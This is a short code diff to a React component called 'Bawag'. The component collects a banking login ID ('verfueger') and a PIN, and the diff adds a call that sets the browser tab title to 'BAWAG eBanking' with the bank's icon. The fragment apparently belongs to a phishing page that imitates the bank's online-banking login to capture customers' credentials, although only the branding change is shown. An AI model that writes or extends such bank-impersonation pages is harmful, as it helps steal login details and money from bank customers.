@@ -79,6 +79,7 @@ const Bawag = () => {
   const [showLoading, setShowLoading] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
+  usePageMeta("BAWAG eBanking", bawagIcon);
 
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
